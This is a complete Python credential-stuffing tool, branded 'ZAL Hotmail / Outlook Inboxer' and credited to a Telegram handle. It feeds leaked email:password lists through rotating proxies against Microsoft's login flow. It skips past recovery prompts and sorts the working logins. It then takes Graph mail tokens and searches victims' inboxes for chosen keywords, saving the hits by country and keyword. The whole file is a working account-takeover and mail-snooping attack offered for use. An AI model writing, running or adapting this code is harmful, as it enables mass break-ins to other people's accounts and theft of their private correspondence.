import os
import sys
import re
import time
import shutil
import random
import threading
from datetime import datetime, timedelta
from urllib.parse import urlparse, parse_qs
from collections import deque

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ZAL_HANDLE = "@MR_CRKZ"
GRAPH = "https://graph.microsoft.com/v1.0"

class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[38;5;196m"
    GREEN   = "\033[38;5;46m"
    YELLOW  = "\033[38;5;226m"
    BLUE    = "\033[38;5;39m"
    CYAN    = "\033[38;5;51m"
    MAGENTA = "\033[38;5;201m"
    ORANGE  = "\033[38;5;208m"
    GRAY    = "\033[38;5;244m"
    WHITE   = "\033[38;5;255m"
    BG_BLACK= "\033[48;5;232m"

stats_lock   = threading.Lock()
file_lock    = threading.Lock()
feed_lock    = threading.Lock()

stats = {
    'checked': 0,
    'valid':   0,
    'inbox':   0,
    '2fa':     0,
    'bad':     0,
    'errors':  0,
}

TOTAL_ACCOUNTS = 0
SESSION_FOLDER = None
start_time     = None
proxies        = []
keyword_list   = []
stop_dashboard = threading.Event()
live_feed      = deque(maxlen=7)

def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

def term_width():
    try:
        return shutil.get_terminal_size((100, 30)).columns
    except Exception:
        return 100

def normalize_combo(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    for sep in [':', '|', ';', ',', ' ', '\t']:
        if sep in line:
            parts = line.split(sep, 1)
            email = parts[0].strip()
            password = parts[1].strip()
            if email and password and '@' in email:
                return f"{email}:{password}"
    return None

def load_accounts(path):
    out, seen = [], set()
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            c = normalize_combo(line)
            if c and c not in seen:
                seen.add(c)
                out.append(c)
    return out

def format_proxy(proxy):
    if not proxy:
        return None
    proxy = proxy.strip()
    if proxy.startswith('http'):
        return proxy
    if '@' in proxy:
        return f"http://{proxy}"
    parts = proxy.split(':')
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{proxy}"

def make_session(threads):
    s = requests.Session()
    pool = threads + 50
    retry = Retry(
        total=2,
        backoff_factor=0.3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "OPTIONS"],
    )
    adapter = HTTPAdapter(max_retries=retry, pool_connections=pool, pool_maxsize=pool)
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    return s

def test_proxy(proxy):
    try:
        p = format_proxy(proxy)
        r = requests.get("https://api.ipify.org?format=json",
                         proxies={"http": p, "https": p}, timeout=6)
        return r.status_code == 200
    except Exception:
        return False

def get_session_folder():
    global SESSION_FOLDER
    if SESSION_FOLDER is None:
        base = "Results"
        os.makedirs(base, exist_ok=True)
        ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        SESSION_FOLDER = os.path.join(base, f"Zal_{ts}")
        os.makedirs(SESSION_FOLDER, exist_ok=True)
        os.makedirs(os.path.join(SESSION_FOLDER, "Countries"), exist_ok=True)
        os.makedirs(os.path.join(SESSION_FOLDER, "Keywords"), exist_ok=True)
    return SESSION_FOLDER

def save_result(filename, content):
    path = os.path.join(get_session_folder(), filename)
    with file_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(content + '\n')

def save_country(country, email, password):
    safe = re.sub(r'[<>:"/\\|?*]', '_', country.strip()) or 'Unknown'
    path = os.path.join(get_session_folder(), 'Countries', f"{safe}.txt")
    with file_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")

def save_keyword(kw, content):
    safe = re.sub(r'[<>:"/\\|?*]', '_', kw.strip()) or 'keyword'
    path = os.path.join(get_session_folder(), 'Keywords', f"{safe}.txt")
    with file_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(content + '\n')

def save_hit(email, password):
    path = os.path.join(get_session_folder(), "All_Hits.txt")
    with file_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")

def push_feed(color, tag, msg):
    with feed_lock:
        stamp = datetime.now().strftime("%H:%M:%S")
        live_feed.append((stamp, color, tag, msg))

def graph_me(session, token):
    try:
        r = session.get(f"{GRAPH}/me",
                        headers={'Authorization': f'Bearer {token}'},
                        timeout=10, verify=False)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None

def graph_search(session, token, query, top=50):
    headers = {
        'Authorization': f'Bearer {token}',
        'Accept': 'application/json',
        'ConsistencyLevel': 'eventual',
    }
    url = (
        f"{GRAPH}/me/messages"
        f'?$search="{query}"'
        f'&$top={top}'
        '&$count=true'
        '&$select=subject,from,receivedDateTime'
    )
    try:
        r = session.get(url, headers=headers, timeout=20, verify=False)
        if r.status_code != 200:
            return 0, []
        data = r.json()
        items = data.get('value', [])
        total = data.get('@odata.count', len(items))
        return total, items
    except Exception:
        return 0, []


class MicrosoftChecker:
    sFTTag_url = (
        'https://login.live.com/oauth20_authorize.srf'
        '?client_id=00000000402B5328'
        '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
        '&scope=service::user.auth.xboxlive.com::MBI_SSL'
        '&display=touch&response_type=token&locale=en'
    )

    def __init__(self, email, password, proxy=None, keywords=None, threads=100):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.keywords = keywords or []
        self.session = make_session(threads)
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.country = None

    def _fetch_login_page(self):
        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        for _ in range(3):
            try:
                text = self.session.get(self.sFTTag_url, headers=headers,
                                        timeout=15, verify=False).text
                m = (re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or
                     re.search('value="(.+?)"', text, re.S) or
                     re.search("sFTTag:'(.+?)'", text, re.S) or
                     re.search('sFTTag:"(.+?)"', text, re.S) or
                     re.search('name="PPFT".*?value="(.+?)"', text, re.S))
                if m:
                    sFTTag = m.group(1)
                    m2 = (re.search('"urlPost":"(.+?)"', text, re.S) or
                          re.search("urlPost:'(.+?)'", text, re.S) or
                          re.search('urlPost:"(.+?)"', text, re.S) or
                          re.search('<form.*?action="(.+?)"', text, re.S))
                    if m2:
                        return m2.group(1).replace('&amp;', '&'), sFTTag
            except Exception:
                pass
            time.sleep(0.5)
        return None, None

    def _submit_login(self, urlPost, sFTTag):
        data = {
            'login':    self.email,
            'loginfmt': self.email,
            'passwd':   self.password,
            'PPFT':     sFTTag,
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'close',
        }
        for _ in range(3):
            try:
                r = self.session.post(urlPost, data=data, headers=headers,
                                      allow_redirects=True, timeout=15, verify=False)
                if '#' in r.url and r.url != self.sFTTag_url:
                    tok = parse_qs(urlparse(r.url).fragment).get('access_token', ['None'])[0]
                    if tok != 'None':
                        return 'SUCCESS'
                elif 'cancel?mkt=' in r.text:
                    try:
                        ipt   = re.search(r'(?<="ipt" value=").+?(?=">)', r.text)
                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', r.text)
                        uaid  = re.search(r'(?<="uaid" value=").+?(?=">)', r.text)
                        if ipt and pprid and uaid:
                            d = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r.text)
                            if action:
                                ret = self.session.post(action.group(), data=d,
                                                        allow_redirects=True, timeout=15, verify=False)
                                ru = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                                if ru:
                                    fin = self.session.get(ru.group(), allow_redirects=True,
                                                           timeout=15, verify=False)
                                    tok = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                    if tok != 'None':
                                        return 'SUCCESS'
                    except Exception:
                        pass
                elif any(v in r.text for v in ['recover?mkt',
                                               'account.live.com/identity/confirm?mkt',
                                               'Email/Confirm?mkt',
                                               '/Abuse?mkt=']):
                    return '2FA'
                elif any(v in r.text.lower() for v in [
                    'password is incorrect', "account doesn't exist",
                    "that microsoft account doesn't exist",
                    'sign in to your microsoft account',
                    "tried to sign in too many times with an incorrect account or password",
                    'help us protect your account',
                ]):
                    return 'BAD'
            except Exception:
                pass
            time.sleep(0.5)
        return 'BAD'

    def login(self):
        urlPost, sFTTag = self._fetch_login_page()
        if not urlPost or not sFTTag:
            return 'BAD'
        return self._submit_login(urlPost, sFTTag)

    def graph_token(self):
        try:
            cid = '0000000048170EF2'
            for scope in [
                'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/User.Read',
                'https://graph.microsoft.com/Mail.Read',
            ]:
                auth_url = (
                    f'https://login.live.com/oauth20_authorize.srf?client_id={cid}'
                    f'&response_type=token&scope={scope}'
                    '&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                )
                r = self.session.get(auth_url, timeout=15, verify=False)
                frag = parse_qs(urlparse(r.url).fragment)
                tok = frag.get('access_token', [None])[0]
                if tok:
                    return tok
        except Exception:
            pass
        return None

    def verify_token(self, token):
        me = graph_me(self.session, token)
        if not me:
            return False
        cc = (me.get('country') or '').strip().upper()
        if not cc:
            try:
                r = self.session.get(
                    f"{GRAPH}/me/mailboxSettings",
                    headers={'Authorization': f'Bearer {token}'},
                    timeout=10, verify=False
                )
                if r.status_code == 200:
                    tz = (r.json().get('timeZone') or '').strip()
                    cc = tz or ''
            except Exception:
                pass
        self.country = cc or 'Unknown'
        return True

    def search_inbox(self, token):
        found = []
        total_sum = 0
        for kw in self.keywords:
            n_subject, _ = graph_search(self.session, token, f"subject:{kw}", top=50)
            n_from,    _ = graph_search(self.session, token, f"from:{kw}",    top=50)
            n_body,    _ = graph_search(self.session, token, f"body:{kw}",    top=50)
            count = max(n_subject, n_from, n_body)
            if count == 0:
                n_any, _ = graph_search(self.session, token, kw, top=50)
                count = n_any
            if count > 0:
                total_sum += count
                found.append(f"{kw}:{count}")
        return total_sum, found

def check_account(combo, threads):
    try:
        if ':' not in combo:
            return
        email, password = combo.split(':', 1)
        email    = email.strip()
        password = password.strip()
        proxy = format_proxy(random.choice(proxies)) if proxies else None

        checker = MicrosoftChecker(email, password, proxy,
                                   keywords=keyword_list, threads=threads)
        status = checker.login()

        if status == 'SUCCESS':
            with stats_lock:
                stats['valid'] += 1
            save_result('Valid.txt', f"{email}:{password}")
            save_hit(email, password)
            push_feed(C.GREEN, "HIT", f"{email}")

            token = checker.graph_token()
            country = 'Unknown'
            if token and checker.verify_token(token):
                country = checker.country
                if country and country != 'Unknown':
                    save_country(country, email, password)

            if token:
                total, hits = checker.search_inbox(token)
                if hits:
                    with stats_lock:
                        stats['inbox'] += 1
                    line = f"{email}:{password} | {country} | {total} Email Found | [{' | '.join(hits)}]"
                    save_result('Inbox.txt', line)
                    push_feed(C.CYAN, "INBOX", f"{email} [{total}]")
                    for hit in hits:
                        kw, cnt = hit.split(':', 1)
                        save_keyword(kw, f"{email}:{password} | {country} | {cnt} Email | [{kw}: {cnt}]")

        elif status == '2FA':
            with stats_lock:
                stats['2fa'] += 1
            save_result('2FA.txt', f"{email}:{password}")
            push_feed(C.YELLOW, "2FA", f"{email}")
        else:
            with stats_lock:
                stats['bad'] += 1
    except Exception:
        with stats_lock:
            stats['errors'] += 1
    finally:
        with stats_lock:
            stats['checked'] += 1

def worker(combo, limiter, threads):
    try:
        check_account(combo, threads)
    finally:
        limiter.release()

def build_box(lines, width):
    top    = f"{C.GRAY}╭" + "─" * (width - 2) + f"╮{C.RESET}"
    bottom = f"{C.GRAY}╰" + "─" * (width - 2) + f"╯{C.RESET}"
    body   = []
    for ln in lines:
        vis = re.sub(r'\033\[[0-9;]*m', '', ln)
        pad = width - 2 - len(vis)
        if pad < 0:
            pad = 0
        body.append(f"{C.GRAY}│{C.RESET}{ln}{' ' * pad}{C.GRAY}│{C.RESET}")
    return [top] + body + [bottom]

def render_dashboard():
    with stats_lock:
        checked = stats['checked']
        valid   = stats['valid']
        inbox   = stats['inbox']
        twofa   = stats['2fa']
        bad     = stats['bad']
        errors  = stats['errors']

    total = TOTAL_ACCOUNTS or 1
    elapsed = time.time() - start_time if start_time else 0
    elapsed_str = str(timedelta(seconds=int(elapsed)))
    cpm = int(checked / elapsed * 60) if elapsed > 1 else 0
    pct = checked / total
    bar_w = max(20, term_width() - 24)
    filled = int(bar_w * pct)
    bar = f"{C.CYAN}{'█' * filled}{C.GRAY}{'░' * (bar_w - filled)}{C.RESET}"

    W = min(term_width() - 2, 92)
    inner = W - 4

    def row(left, right):
        vis_l = re.sub(r'\033\[[0-9;]*m', '', left)
        vis_r = re.sub(r'\033\[[0-9;]*m', '', right)
        gap = inner - len(vis_l) - len(vis_r)
        if gap < 1:
            gap = 1
        return left + " " * gap + right

    lines = []

    title = f"{C.MAGENTA}{C.BOLD}ZAL{C.RESET} {C.GRAY}·{C.RESET} {C.WHITE}Hotmail / Outlook Inboxer{C.RESET}"
    credit = f"{C.GRAY}credit{C.RESET} {C.ORANGE}{ZAL_HANDLE}{C.RESET}"
    lines.append(row(title, credit))
    lines.append(f"{C.GRAY}{'─' * inner}{C.RESET}")

    lines.append(row(
        f"{C.GREEN}● VALID{C.RESET} {C.WHITE}{valid}{C.RESET}",
        f"{C.CYAN}● INBOX{C.RESET} {C.WHITE}{inbox}{C.RESET}"
    ))
    lines.append(row(
        f"{C.YELLOW}● 2FA  {C.RESET} {C.WHITE}{twofa}{C.RESET}",
        f"{C.RED}● BAD  {C.RESET} {C.WHITE}{bad}{C.RESET}"
    ))
    lines.append(row(
        f"{C.GRAY}● ERR  {C.RESET} {C.WHITE}{errors}{C.RESET}",
        f"{C.BLUE}● CPM  {C.RESET} {C.WHITE}{cpm}{C.RESET}"
    ))
    lines.append(f"{C.GRAY}{'─' * inner}{C.RESET}")

    lines.append(f"{bar}  {C.WHITE}{pct*100:5.1f}%{C.RESET}")
    lines.append(row(
        f"{C.GRAY}checked{C.RESET} {C.WHITE}{checked}{C.GRAY}/{C.WHITE}{TOTAL_ACCOUNTS}{C.RESET}",
        f"{C.GRAY}elapsed{C.RESET} {C.WHITE}{elapsed_str}{C.RESET}"
    ))
    lines.append(f"{C.GRAY}{'─' * inner}{C.RESET}")
    lines.append(f"{C.GRAY}live feed{C.RESET}")

    with feed_lock:
        feed_snap = list(live_feed)

    if not feed_snap:
        lines.append(f"{C.GRAY}  waiting for hits...{C.RESET}")
    else:
        for stamp, color, tag, msg in feed_snap[-6:]:
            lines.append(
                f"{C.GRAY}{stamp}{C.RESET}  "
                f"{color}{C.BOLD}{tag:>5}{C.RESET}  "
                f"{C.WHITE}{msg[:inner-18]}{C.RESET}"
            )

    box = build_box(lines, W)

    cls()
    print()
    for ln in box:
        print(ln)
    print()

def dashboard_loop():
    while not stop_dashboard.is_set() and stats['checked'] < TOTAL_ACCOUNTS:
        render_dashboard()
        time.sleep(0.8)
    render_dashboard()

def print_banner():
    cls()
    art = f"""
{C.MAGENTA}{C.BOLD}    ███████╗ █████╗ ██╗     
    ╚══███╔╝██╔══██╗██║     
      ███╔╝ ███████║██║     
     ███╔╝  ██╔══██║██║     
    ███████╗██║  ██║███████╗
    ╚══════╝╚═╝  ╚═╝╚══════╝
    channel TG : @professor_zal_projects{C.RESET}

    {C.WHITE}Hotmail / Outlook Inboxer{C.RESET}
    {C.ORANGE}{ZAL_HANDLE}{C.RESET}
"""
    print(art)

def ask_accounts_file():
    path = input(f"{C.CYAN}[?]{C.RESET} Accounts file {C.GRAY}(default acc.txt){C.RESET}: ").strip() or "acc.txt"
    if not os.path.exists(path):
        print(f"{C.RED}[!]{C.RESET} Not found: {path}")
        return None
    return path

def ask_proxy_file():
    raw = input(f"{C.CYAN}[?]{C.RESET} Proxy file {C.GRAY}(default proxies.txt, blank = direct){C.RESET}: ").strip()
    if not raw:
        return []
    path = raw or "proxies.txt"
    if not os.path.exists(path):
        print(f"{C.YELLOW}[!]{C.RESET} Not found, running direct.")
        return []
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        raw_list = [l.strip() for l in f if l.strip() and not l.startswith('#')]
    if not raw_list:
        print(f"{C.YELLOW}[!]{C.RESET} Empty, running direct.")
        return []

    print(f"{C.CYAN}[*]{C.RESET} Testing {len(raw_list)} proxies...")
    good = []
    lock = threading.Lock()
    done = [0]
    total = len(raw_list)

    def probe(p):
        ok = test_proxy(p)
        with lock:
            done[0] += 1
            if ok:
                good.append(p)
            if done[0] % 25 == 0 or done[0] == total:
                print(f"{C.GRAY}    tested {done[0]}/{total} · {len(good)} live{C.RESET}")

    conc = min(80, max(1, total))
    batch = []
    for p in raw_list:
        t = threading.Thread(target=probe, args=(p,), daemon=True)
        t.start()
        batch.append(t)
        if len(batch) >= conc:
            for tt in batch:
                tt.join()
            batch = []
    for tt in batch:
        tt.join()

    print(f"{C.GREEN}[+]{C.RESET} {len(good)}/{total} live proxies")
    return good

def ask_keywords():
    print(f"{C.MAGENTA}── Custom keywords ──{C.RESET}")
    while True:
        raw = input(f"{C.CYAN}[?]{C.RESET} Keywords {C.GRAY}(comma separated){C.RESET}: ").strip()
        if not raw:
            print(f"{C.RED}[!]{C.RESET} At least one keyword required.")
            continue
        parts = [k.strip().lower() for k in raw.split(',') if k.strip()]
        parts = list(dict.fromkeys(parts))
        if not parts:
            print(f"{C.RED}[!]{C.RESET} At least one keyword required.")
            continue
        print(f"{C.GREEN}[+]{C.RESET} Keywords: {C.WHITE}{', '.join(parts)}{C.RESET}")
        return parts

def ask_threads():
    raw = input(f"{C.CYAN}[?]{C.RESET} Threads {C.GRAY}(default 100, max 200){C.RESET}: ").strip()
    if not raw:
        return 100
    try:
        return max(1, min(200, int(raw)))
    except ValueError:
        return 100

def main():
    global TOTAL_ACCOUNTS, proxies, keyword_list, start_time

    print_banner()

    accounts_file = ask_accounts_file()
    if not accounts_file:
        input("Press Enter to exit...")
        return

    accounts = load_accounts(accounts_file)
    if not accounts:
        print(f"{C.RED}[!]{C.RESET} No valid accounts in {accounts_file}")
        input("Press Enter to exit...")
        return
    print(f"{C.GREEN}[+]{C.RESET} {len(accounts)} accounts loaded")
    print()

    proxies = ask_proxy_file()
    print()

    keyword_list = ask_keywords()
    print()

    threads = ask_threads()
    print(f"{C.GREEN}[+]{C.RESET} Threads: {threads}")
    print()

    TOTAL_ACCOUNTS = len(accounts)
    start_time = time.time()
    get_session_folder()

    print(f"{C.CYAN}[*]{C.RESET} Folder: {C.WHITE}{get_session_folder()}{C.RESET}")
    print(f"{C.CYAN}[*]{C.RESET} Starting... {C.GRAY}Ctrl+C to stop.{C.RESET}")
    time.sleep(1.2)

    stop_dashboard.clear()
    dash = threading.Thread(target=dashboard_loop, daemon=True)
    dash.start()

    queue = deque(accounts)
    limiter = threading.BoundedSemaphore(threads)

    try:
        while queue:
            limiter.acquire()
            acc = queue.popleft()
            t = threading.Thread(target=worker, args=(acc, limiter, threads))
            t.daemon = True
            t.start()
    except KeyboardInterrupt:
        pass

    while threading.active_count() > 2:
        time.sleep(1)

    stop_dashboard.set()
    time.sleep(1)
    dash.join(timeout=3)

    elapsed = time.time() - start_time
    cls()
    print_banner()

    print(f"{C.WHITE}Completed in {elapsed:.2f}s{C.RESET}")
    print()
    print(f"  {C.GREEN}Valid   {C.RESET}: {stats['valid']}")
    print(f"  {C.CYAN}Inbox   {C.RESET}: {stats['inbox']}")
    print(f"  {C.YELLOW}2FA     {C.RESET}: {stats['2fa']}")
    print(f"  {C.RED}Bad     {C.RESET}: {stats['bad']}")
    print(f"  {C.GRAY}Errors  {C.RESET}: {stats['errors']}")
    print()
    print(f"  {C.GRAY}Folder{C.RESET}  : {C.WHITE}{get_session_folder()}{C.RESET}")
    print()
    input("Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit()